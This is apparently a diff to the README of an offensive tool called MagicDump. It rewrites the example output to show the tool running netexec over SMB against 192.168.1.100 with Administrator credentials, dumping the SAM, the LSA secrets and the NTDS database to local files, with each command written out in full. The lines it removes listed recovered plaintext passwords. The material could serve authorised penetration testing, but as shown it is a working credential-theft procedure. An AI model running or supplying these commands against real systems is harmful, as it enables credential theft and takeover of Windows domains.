@@ -89,19 +89,27 @@ For help:
 
 Output:
 ```bash
+==============================
+       MagicDump v1.0       
+==============================
 [INFO] Starting MagicDump against target 192.168.1.100
 [INFO] Authenticating as user 'Administrator'...
-[INFO] Connecting to target 192.168.1.100 via SMB...
+[INFO] Starting SAM dump using netexec...
+[DEBUG] Running command: nxc smb 192.168.1.100 -u Administrator -p 'SuperSecretPass' --sam > '/home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt' 2>/dev/null
+[DEBUG] SAM dump completed successfully. Output saved to /home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt
 [LOG] Operation: SAM, Status: success
-[INFO] SAM dump saved to /home/pascal/.magicdump/dumps/SAM_dumped_192.168.1.100.txt
-[LOG] Operation: LSASS, Status: success
-[INFO] LSASS dumped and decrypted successfully
-[CREDENTIALS FOUND]:
-Administrator: SuperSecretPass123
-User1: Passw0rd!
-[LOG] Operation: NTDS, Status: failed
-[WARNING] Failed to dump NTDS: Access denied
-[INFO] Dumping complete. Logs saved to /home/pascal/.magicdump/logs/report_192.168.1.100_20250104135344.json.
+[INFO] SAM dump saved to /home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt
+[INFO] Starting LSA dump using netexec...
+[DEBUG] Running command: nxc smb 192.168.1.100 -u Administrator -p 'SuperSecretPass' --lsa > '/home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt' 2>/dev/null
+[DEBUG] LSA dump completed successfully. Output saved to /home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt
+[LOG] Operation: LSA, Status: success
+[INFO] LSA dump saved to /home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt
+[INFO] Starting NTDS dump using ntdsutil...
+[DEBUG] Running command: nxc smb 192.168.1.100 -u Administrator -p 'SuperSecretPass' -M ntdsutil > '/home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt' 2>/dev/null
+[DEBUG] NTDS dump completed successfully. Output saved to /home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt
+[LOG] Operation: NTDS, Status: success
+[INFO] NTDS dump saved to /home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt
+[INFO] Dumping complete. Logs saved to /home/user/.magicdump/logs/report_192.168.1.100_20250104140000.json.
 ```
 
 <br>
